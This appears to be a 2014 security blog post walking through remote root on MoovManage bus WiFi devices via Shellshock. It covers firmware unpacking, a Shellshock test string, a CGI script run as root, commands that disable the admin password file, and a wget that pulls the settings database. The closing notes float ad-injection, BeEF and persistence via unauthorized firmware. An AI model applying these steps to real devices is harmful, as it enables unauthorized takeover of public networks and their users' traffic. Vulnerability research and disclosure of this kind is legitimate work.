---
layout: post
title:  "Remote Root via ShellShock in MoovManage Endpoint Devices (and some post exploitation exploration!)"
date:   2014-12-01 23:00:00
---

Ok, so we are all, by now, probably familiar with the [Shellshock][shellshock] vulnerability in Bash, and the fact that it can be exploited remotely via various vectors, including CGI scripts that call out to the Bash shell.

Now, I always had some questions about those annoying [Moovmanage][moovmanage] WiFi boxes on buses, which provide free (albeit censored) WiFi, and sometimes inject advertizements into your HTTP traffic. Which, naturally, I found a tad offensive. A good while back I had a quick poke at them, but recently, I struck fucking gold when I came across a site that offered downloads of firmware binaries for a whole heap of different versions.

## Unpacking MoovEngine Binary

This was trivial, accomplished by using [Binwalk][binwalk] and uncramfs from [Firmware Mod Kit][fmk]. Just used binwalk to get the cramfs filesystem out and uncramfs to unpackage it into a directory for analysis. This takes only a few minutes normally (with binwalk constantly improving, soon it will likely only take seconds!), and sure as hell beats going over it with a fucking hex editor or whatever!

{% highlight bash %}
root@unsanitized:~/hacking_moovbox# binwalk -e M220-1.9.0.fw 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
100           0x64            CramFS filesystem, little endian size 14569472 version #2 sorted_dirs CRC 0x81dfea32, edition 0, 7640 blocks, 1185 files

root@unsanitized:~/hacking_moovbox# cd _M220-1.9.0.fw.extracted/
root@unsanitized:~/hacking_moovbox/_M220-1.9.0.fw.extracted# /opt/firmware-mod-kit/src/uncramfs/uncramfs fs 64.cramfs 
[Volume size: 0xde5000]
[Volume serial: 32eadf8100000000d81d0000a1040000]
[Volume name: Compressed]

drwxr-xr-x 0/0               372(372)     /

/:
drwxr-xr-x 0/0                84(84)      admin
drwxr-xr-x 0/0              1672(1672)    bin
drwxr-xr-x 0/0                 0(0)       boot
lrwxrwxrwx 0/0                10(22)      caps -> /boot/caps
drwxr-xr-x 0/0                20(20)      dev
drwxr-xr-x 0/0              1384(1384)    etc
drwxr-xr-x 0/0              2568(2568)    lib
lrwxrwxrwx 0/0                12(24)      linuxrc -> /bin/busybox
drwxr-xr-x 0/0                 0(0)       lost+found
drwxr-xr-x 0/0                 0(0)       proc
drwxr-xr-x 0/0               108(108)     ro
lrwxrwxrwx 0/0                 8(20)      root -> /rw/root
drwxr-xr-x 0/0                 0(0)       rw
drwxr-xr-x 0/0              2588(2588)    sbin
drwxr-xr-x 0/0                 0(0)       sys
lrwxrwxrwx 0/0                12(24)      templates -> rw/templates
lrwxrwxrwx 0/0                 7(19)      tmp -> /rw/tmp
drwxr-xr-x 0/0               108(108)     usr
lrwxrwxrwx 0/0                 7(19)      var -> /rw/var
-rw-r--r-- 0/0           1432848(1428569) vmlinuz
drwxr-xr-x 0/0                24(24)      webserver

NOTE: SNIPPED BECAUSE REASONS.

[Summary:]
[Total uncompressed size:     29718558]
[Total compressed size:       14834791]
[Number of entries:               1178]
[Number of files compressed:       902]
[Number of files expanded:         276]

root@unsanitized:~/hacking_moovbox/_M220-1.9.0.fw.extracted#
{% endhighlight %}

## Symlinks are fun too!

Acting on a whim, due to the recent [Shellshock][shellshock] funtimes, and my recently written [shellshock exploit][shellsploit], I decided to go check if "bash" was being used on these things, as they seemed to be a bit more than just a simple Busybox setup.

{% highlight bash %}
root@unsanitized:~/hacking_moovbox/_M220-1.9.0.fw.extracted/fs/bin# ls -l ./sh
lrwxrwxrwx 1 root root 4 Oct  6 23:38 ./sh -> bash
root@unsanitized:~/hacking_moovbox/_M220-1.9.0.fw.extracted/fs/bin#
{% endhighlight %}

Naturally, the next thing to do was determine if it was a version vulnerable to shellshock. Lo and behold, it was.

{% highlight bash %}
root@unsanitized:~/hacking_moovbox/_M220-1.9.0.fw.extracted/fs/bin# env x='() { :;}; echo vulnerable' ./bash -c "echo this is a test"
vulnerable
this is a test
root@unsanitized:~/hacking_moovbox/_M220-1.9.0.fw.extracted/fs/bin# 
{% endhighlight %}

## Yes, hello, CGI scripts?

In /admin/www/, there are a couple of interesting files.
{% highlight bash %}
root@unsanitized:~/hacking_moovbox/_M220-1.9.0.fw.extracted/fs/admin/www# ls -a
.
..
admin 
css 
images 
index.cgi 
js
root@unsanitized:~/hacking_moovbox/_M220-1.9.0.fw.extracted/fs/admin/www# 
{% endhighlight %}

I decided to take a look at "index.cgi" file, as it looked likely to contain some fun.

{% highlight bash %}
root@unsanitized:~/hacking_moovbox/_M220-1.9.0.fw.extracted/fs/admin/www# 
#!/bin/sh


echo "Status: 301 Moved Permanantly\n";
echo "Location: /admin/configurator"
echo ""
root@unsanitized:~/hacking_moovbox/_M220-1.9.0.fw.extracted/fs/admin/www# 
{% endhighlight %}

Now, at first, this does *not* look all that interesting. Until you realize what that CGI script is calling. /bin/sh. Which we noticed calls /bin/bash...

## Remote Root, shitty configs.

From the above, when we realized the Bash version on these things was vulnerable to Shellshock, we can now infer that these things are, in fact, vulnerable to Shellshock. Our privs will be limited only by the webserver on them. This being an *embedded* device, we fully expect the webserver will be running as the "root" user. So our shellshocking will be demolishment.

{% highlight bash %}
root@unsanitized:~/hacking_moovbox/_M220-1.9.0.fw.extracted/fs/etc/mini_httpd# cat config
nochroot
dir=/var/www
cgipat=**.cgi
user=root
root@unsanitized:~/hacking_moovbox/_M220-1.9.0.fw.extracted/fs/etc/mini_httpd#
{% endhighlight %}

That config seems really, really sane... Specifying no chroot... Specifying to run as root (it can drop privs, you know!)... Good times! So now we know that whatever code we run using the Shellshock exploit will run as root. Game over.

## Disabling (temporarily) auth...

The .htaccess file on the box, in /admin/www/admin (protecting the configurator binary, which is the web interface CGI thing) is actually a symlink.

{% highlight bash %}
.htpasswd -> /rw/admin/.htpasswd
{% endhighlight %}

Now, you will notice the /rw/ in the path. Much of the filesystem on this device is, in fact, read only. Luckily for us, the .htaccess is updateable, and is kept in the read/write part of the filesystem.

In order to disable the authentication, we simply rename the stupid .htaccess file.

{% highlight bash %}
mv /rw/admin/.htpasswd /rw/admin/htpw
{% endhighlight %}

Now, if we visit the web interface, we are fully authenticated and can do whatever we like. To re-enable the auth, just move the file back, as follows.

{% highlight bash %}
mv /rw/admin/htpw /rw/admin/.htpasswd
{% endhighlight %}

## Database files! Snarfing config!

Once you have bypassed the auth, you can either pop into the thing and retrieve the sqlite3 database manually... Or you can just wget it like I did.

{% highlight bash %}
# the following command downloads the sqlite3 database once auth is removed
wget --no-check-certificate https://10.0.0.1/admin/moovbox.settings
{% endhighlight %}

Now, we want to retrieve the settings from this database, right?

{% highlight bash %}
root@unsanitized:~/hacking_moovbox# sqlite3 moovbox.settings
SQLite version 3.8.7.1 2014-10-29 13:59:56
Enter ".help" for usage hints.
sqlite> .tables
ethernet         setting          vap            
interface_group  static_routes    vlan           
port_forwards    tunnels          wifi           
sqlite> select * from setting;
cfg_version|15
password|password
gateway|
dns_primary|0.0.0.0
dns_secondary|
# snipped
{% endhighlight %}




> wtf packet sniffer? libpcap? Some kinda debug feature...

> How nice. A code injector! (banner ad injector using Privoxy)

> (theoretical) BeEF The Bus!

> Unauthorized firmware upgrades for persistence...

> All Your Passwords (sidenote).

> This is only the beginning.


[shellshock]:
[moovmanage]: 
[shellsploit]:
[binwalk]:
[fmk]:

